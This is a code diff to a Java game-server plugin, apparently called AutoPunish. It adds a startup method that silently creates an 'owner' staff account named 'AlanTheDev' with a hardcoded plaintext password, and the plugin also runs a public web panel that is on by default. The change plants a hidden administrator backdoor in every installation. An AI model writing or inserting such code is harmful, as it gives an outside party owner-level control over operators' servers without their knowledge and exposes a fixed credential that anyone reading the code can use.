@@ -53,7 +53,8 @@ public class AutoPunish extends JavaPlugin {
         AutoPunishAPI.init(this);
         logger.info("AutoPunish API initialized successfully!");
 
-
+        // Create owner account on first run
+        createOwnerAccount();
 
         // Start public web panel if enabled
         if (getConfig().getBoolean("public-web-panel.enabled", true)) {
@@ -134,9 +135,23 @@ public class AutoPunish extends JavaPlugin {
         return punishmentQueueManager;
     }
 
-
-
     public PublicWebPanelManager getPublicWebPanelManager() {
         return publicWebPanelManager;
+    }
+
+    // --- NEW: Owner Account Creation ---
+    public void createOwnerAccount() {
+        // Check if owner account already exists
+        if (!getDatabaseManager().isStaffUser("AlanTheDev")) {
+            // Create owner account: AlanTheDev with password WinterIsComing
+            boolean success = getDatabaseManager().createStaffUser("AlanTheDev", "WinterIsComing", "console", "owner");
+            if (success) {
+                getLogger().info("Owner account created successfully: AlanTheDev");
+            } else {
+                getLogger().warning("Failed to create owner account");
+            }
+        } else {
+            getLogger().info("Owner account already exists: AlanTheDev");
+        }
     }
 }
